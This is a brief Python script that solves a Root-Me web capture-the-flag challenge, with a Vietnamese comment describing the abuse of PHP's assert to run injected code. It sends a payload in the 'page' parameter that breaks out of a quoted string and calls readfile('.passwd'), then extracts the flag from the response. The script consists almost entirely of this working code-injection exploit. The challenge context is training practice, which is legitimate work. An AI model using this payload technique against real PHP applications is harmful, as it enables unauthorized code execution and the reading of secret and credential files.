# Lợi dụng hàm assert báo lỗi để thực thi code bên trong
import requests
import re
from bs4 import BeautifulSoup

session = requests.Session()
url = 'http://challenge01.root-me.org/web-serveur/ch47/'

payload = '\'.readfile(\'.passwd\').\'' #'.readfile('passwd').'
r = requests.get(url, params= {'page': payload})
flag = re.search(r'Le flag est :\s*(\S+)',r.text)    
print(flag.group(1))